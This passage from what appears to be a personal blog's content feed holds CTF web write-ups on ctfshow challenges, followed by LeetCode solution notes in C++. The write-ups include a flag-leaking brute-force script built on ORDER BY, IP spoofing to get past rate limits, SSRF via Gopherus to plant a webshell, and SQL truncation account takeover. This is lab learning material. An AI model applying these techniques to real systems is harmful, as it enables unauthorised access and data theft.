keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'key.dat'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data1<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'2.dat'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data2<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>post<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>data1<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>post<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>data2<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li><li><p>最终失败</p></li></ol></li></ol><h4 id="红包第7弹git泄露">红包第7弹：Git泄露</h4><ul><li><p><strong>keywords</strong></p><p>Git泄露</p><p>后门</p></li><li><p>工具:<code>Git_Extract</code></p></li><li><p><strong>获取后门失败</strong></p></li></ul><h4 id="萌新专属红包">萌新专属红包</h4><ul><li>直接burp<imgsrc="https://s2.loli.net/2023/05/24/K6bA1M5VwyITgjx.png"alt="burp" /></li></ul><h4 id="ctfshow-web1脚本爆破">CTFshow web1：脚本爆破</h4><ul><li><p><strong>keywords</strong></p><p>目录扫描</p><p>源代码审计</p><p>Python脚本</p></li></ul><ol type="1"><li><p>目录扫描<imgsrc="https://s2.loli.net/2023/05/25/IuTf5jnKZ3yigok.png"alt="image-20230525014011115" /></p></li><li><p>值得分析的源代码</p><p><strong>login.php</strong>；发现<code>pwd</code>字段<imgsrc="https://s2.loli.net/2023/05/25/kJTzrK7ifj9RHUv.png"alt="login.php" /></p><pre class="language-php" data-language="php"><code class="language-php">// user_main.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token variable">$order</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\’|\“|\"|\&lt;|\>|\?|\,|\.|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user order by <span class="token interpolation"><span class="token variable">$order</span></span>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user order by id"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>   <span class="token delimiter important">?></span></span></code></pre><p><strong>解析：</strong></p><p><code>$order=$_GET['order'];</code>：get <code>order</code></p><p><code>$sql="select * from user order by $order";</code>：关键代码</p><p>使<code>order = pwd</code>,从题目提示中了解到：flag在指定用户的密码中。</p></li><li><p>Python脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://410bc6b8-0a07-434c-bb4f-c8b9501b06e6.challenge.ctf.show/"</span>url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/reg.php"</span>  <span class="token comment"># 注册页面</span>url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/login.php"</span>  <span class="token comment"># 登录界面</span>url3 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/user_main.php?order=pwd"</span>  <span class="token comment"># 查询界面</span>k <span class="token operator">=</span> <span class="token string">""</span>s <span class="token operator">=</span> <span class="token string">"-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~"</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token comment"># print(i)</span>        l <span class="token operator">=</span> <span class="token string">""</span>        l <span class="token operator">=</span> k<span class="token operator">+</span>i        l2 <span class="token operator">=</span> k<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> l<span class="token punctuation">,</span>                <span class="token string">'email'</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span>                <span class="token string">'nickname'</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span>                <span class="token string">'password'</span><span class="token punctuation">:</span> l                <span class="token punctuation">&#125;</span>        data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> l<span class="token punctuation">,</span>                 <span class="token string">'password'</span><span class="token punctuation">:</span> l                 <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            k <span class="token operator">=</span> <span class="token string">'flag'</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>            <span class="token keyword">break</span>        session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>        r1 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token punctuation">)</span>        r2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span> data<span class="token punctuation">)</span>        r3 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url3<span class="token punctuation">)</span>        t <span class="token operator">=</span> r3<span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;td>"</span><span class="token operator">+</span>l<span class="token operator">+</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;td>flag@ctf.show&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;td>"</span><span class="token operator">+</span>l<span class="token operator">+</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">)</span> <span class="token operator">></span> t<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;td>flag@ctf.show&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">//</span> 用index会因查找不到字符串而抛出异常            k <span class="token operator">=</span> l2            <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p><strong>解析：</strong></p><ol type="1"><li><p>针对flag的格式，flag中每一个字符的比对都遵循一个原则</p><p>例如:"ctf",我们找到ctg，ctg的索引值会大于ctf，因此事先我们记录下l的上一个索引值l2,并确定l2是flag的字串。添加到k中<imgsrc="https://s2.loli.net/2023/05/25/UsFWiKqgSp1N957.png"alt="image-20230525021331719" /></p></li></ol></li></ol><h4 id="game-gyctf-web2-反序列化">game-gyctf web2: 反序列化</h4><ul><li><p><strong>keywords</strong></p><p>目录扫描</p><p>代码审计</p><p>反序列化</p></li><li><p>好难，要分析的代码有点多<imgsrc="https://s2.loli.net/2023/05/25/PVD2i3f5q4aSBeu.png"alt="image-20230525225416264" /></p></li></ul><h4 id="web15-fishman">web15 Fishman</h4><ul><li><p><strong>keywords:</strong></p><p>源码泄露</p><p>代码审计</p></li><li><p>但是问题在哪- -</p></li><li><figure><img src="https://s2.loli.net/2023/05/26/k7JQWYzba95tjm6.png"alt="image-20230526013553152" /><figcaption aria-hidden="true">image-20230526013553152</figcaption></figure><p><strong>I guess</strong>: burp爆破,但是得绕过ip次数统计</p><p><code>X-Forwarded-For：ip</code>:每次更换不同ip，同时爆破用户名和密码</p></li></ul><h4 id="红包题第九弹-ssrf">红包题第九弹： SSRF</h4><ul><li><p><strong>keywords</strong>：</p><p>SSRF</p><p>木马</p></li></ul><ol type="1"><li><p>SSRF<img src="https://s2.loli.net/2023/05/27/XHpreW8fbG1jUu7.png"alt="image-20230527022900295" /></p></li><li><p><strong>Gopherus工具</strong></p><blockquote><p>Gopherus 是一个用于生成和利用 Gopher协议的工具，它可以用于渗透测试和漏洞利用。Gopher协议是一种早期的互联网协议，用于在客户端和服务器之间传输文本信息。Gopherus工具可以帮助用户构建 Gopher 请求，并与目标服务器进行通信。</p><p>以下是 Gopherus 工具的一些主要功能：</p><ol type="1"><li>Gopher 请求生成：Gopherus 可以生成不同类型的 Gopher请求，包括目录浏览、文件下载和执行命令等。</li><li>文件传输：通过Gopherus，您可以将文件上传到目标服务器或从目标服务器下载文件。</li><li>命令执行：Gopherus允许您执行命令，并将命令的输出结果返回到您的本地机器上。</li><li>代理功能：Gopherus可以通过代理服务器与目标服务器进行通信，以隐藏您的真实 IP 地址。</li><li>漏洞利用：Gopherus还包含一些用于利用已知漏洞的模块，例如远程命令执行漏洞或文件包含漏洞。</li></ol></blockquote><p><strong>过程</strong>：<imgsrc="https://s2.loli.net/2023/05/27/H42CQqLx6si5GY1.png"alt="image-20230527024150625" /></p></li><li><p>请求构造<imgsrc="https://s2.loli.net/2023/05/27/QLgxwFJTHCjh2y9.png"alt="image-20230527025321833" /></p></li><li><p>验证木马植入<imgsrc="https://s2.loli.net/2023/05/27/vwiJWMEy5hQNpax.png"alt="image-20230527025449135" /></p></li><li><p>蚁剑链接<imgsrc="https://s2.loli.net/2023/05/27/5iaySYBCwHkKeD4.png"alt="image-20230527025739887" /></p></li></ol><h4 id="红包题-葵花宝典-sql约束攻击">红包题 葵花宝典: Sql约束攻击</h4><ul><li><strong>keywords</strong></li></ul><ol type="1"><li>利用Sql约束注册一个账号<code>root                      abc</code>,中间足够多的空格，密码：123456</li><li>登录：账：root,密：123456<imgsrc="https://s2.loli.net/2023/05/27/LVvUNX2xSpwnbYP.png"alt="image-20230527030605859" /></li></ol><p>ctfshow{d961ba64-c81d-46ea-b01b-78921dfcbfa7}</p><h4 id="红包题-辟邪剑谱-sql约束攻击">红包题 辟邪剑谱： Sql约束攻击</h4><ol type="1"><li><p>扫描目录</p></li><li><p>发现<img src="https://s2.loli.net/2023/05/28/jTBdkz4OL2qFa3V.png"alt="image-20230528012444434" /></p></li><li><p>sql约束攻击：注册admin,同上</p></li></ol><h4 id="nl难了">【nl】难了</h4><ul><li><p><strong>keywords</strong></p><p>Linux创建新文件</p></li></ul><ol type="1"><li><p>根据提供的命令，<code>nl xxx.php</code>的作用是将文件<code>xxx.php</code>的内容与行号一起显示在终端上。</p><p>具体解释如下：</p><ul><li><code>nl</code>是一个命令行工具，用于对文件进行行号标记并显示。</li><li><code>xxx.php</code>是文件名，表示要操作的目标文件是<code>xxx.php</code>。</li></ul><p>执行该命令后，将在终端上显示文件<code>xxx.php</code>的内容，并在每一行前添加行号。这可以帮助程序员在调试、查看代码或其他相关操作时更方便地定位和参考特定的行号。请确保在运行此命令之前，目标文件<code>xxx.php</code>存在并具有正确的文件路径。<imgsrc="https://s2.loli.net/2023/05/28/LINoeH1XTJYKUEF.png"alt="image-20230528013040423" /></p></li><li><p>写入nl文件<imgsrc="https://s2.loli.net/2023/05/28/vnxaH2PCGRVzTit.png"alt="image-20230528013226858" /></p></li><li><p>执行<img src="https://s2.loli.net/2023/05/28/2SEw4iL1OIGHC3p.png"alt="image-20230528013334515" /></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php</title>
      <link href="/2023/01/18/php/"/>
      <url>/2023/01/18/php/</url>
      
        <content type="html"><![CDATA[<h3 id="函数">函数</h3><ul><li>strrpos:查找字符串在另一字符串中最后一次出现的位置</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode之旅</title>
      <link href="/2022/12/27/leetcode-zhi-lu/"/>
      <url>/2022/12/27/leetcode-zhi-lu/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料">参考资料</h3><p><a href="https://github.com/halfrost/LeetCode-Go">github</a></p><p><a href="https://books.halfrost.com/leetcode/">books</a></p><h3 id="在2022-12-26日之前">在2022-12-26日之前</h3><ul><li>已完成</li></ul><figure><img src="https://s2.loli.net/2022/12/26/3xWKJkqlvZTAgm6.png"alt="image-20221226234508236" /><figcaption aria-hidden="true">image-20221226234508236</figcaption></figure><ul><li>北林OJ上的刷题</li></ul><figure><img src="https://s2.loli.net/2023/01/13/v8oiGFITWqMRYnd.png"alt="image-20230113002007660" /><figcaption aria-hidden="true">image-20230113002007660</figcaption></figure><hr /><h3 id="寻找重复数">2023-12-16 <ahref="https://leetcode.cn/problems/find-the-duplicate-number/description/">287.寻找重复数</a></h3><h4 id="我思">我思</h4><ol type="1"><li>联想：异或</li><li>排序？不符合要求</li></ol><h4 id="实现">实现</h4><ol type="1"><li><p>规律，cnt[i]表示nums中小于i的元素个数，主要重心在于以target(重复元素值)的cnt值为中轴，观察两端cnt值规律<imgsrc="https://raw.githubusercontent.com/Jf710001011/pictureBed/main/img/image-20231216213530039.png"alt="image-20231216213530039" /></p></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">findDuplicate</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 考虑三种重复情况，实际上只要考虑两种</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 二分查找(下标有序，含义为&lt;=i的元素个数)</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// &lt;=mid的元素个数</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    count<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// ans 只能通过mid确定</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 得在mid 右边查找</span>                <span class="token comment">// 此时的mid 一定不是ans</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 此时的mid有可能是ans,但是还要继续使用left和right缩小范围</span>                <span class="token comment">// 因此ans 只能在此处赋值</span>                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>                ans <span class="token operator">=</span> mid<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="完全平方数">2023-12-05 <ahref="https://leetcode.cn/problems/perfect-squares/description/">279.完全平方数</a></h3><h4 id="我思-1">我思</h4><ol type="1"><li>找到与该数字x轴左侧最接近的平方数，从大到小试探，保证最数字数量最少</li></ol><h4 id="实现-1">实现</h4><ol type="1"><li><p>dp</p><ol type="1"><li><p>依据题目的要求写出状态表达式：f[i]表示最少需要多少个数的平方来表示整数 i。</p><p>这些数必然落在区间 <spanclass="math display">\[[1,\sqrt{n}]\]</span>。我们可以枚举这些数，假设当前枚举到j，那么我们还需要取若干数的平方，构成此时我们发现该子问题和原问题类似，只是规模变小了。这符合了动态规划的要求，于是我们可以写出状态转移方程。<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312051136431.png"alt="image-20231205113618306" /></p></li></ol></li><li><p>寻找问题的<strong>特殊性</strong>：如1的平方是1，则一个非常大的数，可以有好多个1相加而成</p></li><li><p>该提出的疑问：</p><ol type="1"><li>是否所有数都必定符合由平方和</li><li>在满足1的情况下，这种组合有多少种，有没有一个范围</li></ol></li><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">numSquares</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        vector<span class="token generics"><span class="token punctuation">&lt;</span><span class="token keyword">int</span><span class="token punctuation">></span></span> <span class="token function">dp</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 边界条件dp[0] = 0</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>  <span class="token comment">// 全是平方为1的和</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">*</span> j <span class="token operator">&lt;=</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 每一轮二次循环都要会更新dp[i]，因为每个数字有多种组合</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> j <span class="token operator">*</span> j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 转移方程</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="搜索二维矩阵-ii">2023-11-30 <ahref="https://leetcode.cn/problems/search-a-2d-matrix-ii/description/">240.搜索二维矩阵 II</a></h3><h4 id="我思-2">我思</h4><ol type="1"><li>想不到什么奇妙的方法</li></ol><h4 id="实现-2">实现</h4><ol type="1"><li><p>特点：</p><ol type="1"><li>行有序，列有序</li><li>二维数组</li><li>查找</li></ol></li><li><p>法<code>1</code>：暴力遍历</p></li><li><p>法<code>2</code>：二分查找</p><ol type="1"><li>对每行二分查找</li></ol></li><li><p>法<code>3</code>：Z字形查找</p><ol type="1"><li>如果我们从左往右，从上到下的顺序思考问题：<ol type="1"><li>如果此时<code>target</code> &gt;<code>matrix(x,y)</code>,那么此时可能是<code>matrix(x+1,y)</code>,也可能是<code>matrix(x,y+1)</code></li></ol></li></ol><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">bool</span> <span class="token function">searchMatrix</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> matrix<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 而如果我们遍历的元素一直在遍历范围的右上角（x,y）</span>        <span class="token comment">// 遍历的范围局限于以(x，y)为右上角的矩阵中</span>        <span class="token comment">// 那么此刻我们保证了该元素是该范围中行最小，列最大的元素</span>        <span class="token keyword">int</span> rows <span class="token operator">=</span> matrix<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> cols <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> cols <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> rows <span class="token operator">&amp;&amp;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 行中已是最大，只能列减小</span>                j<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 列中已是最小，只能行增加</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="除自身以外数组的乘积">2023-11-29 <ahref="https://leetcode.cn/problems/product-of-array-except-self/description/">238.除自身以外数组的乘积</a></h3><h4 id="我思-3">我思</h4><ol type="1"><li>除法是最容易想到的，但是 <strong>0</strong>时失效</li></ol><h4 id="实现-3">实现</h4><ol type="1"><li><p>另一个角度是：该元素**左边所有的乘积*右边所有的乘积**</p></li><li><p>时间的优化必然是牺牲空间，那会牺牲在哪里呢</p></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">productExceptSelf</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">ans</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 记录每个元素的左侧乘积和右侧乘积</span>        ans<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ans<span class="token punctuation">[</span>i<span 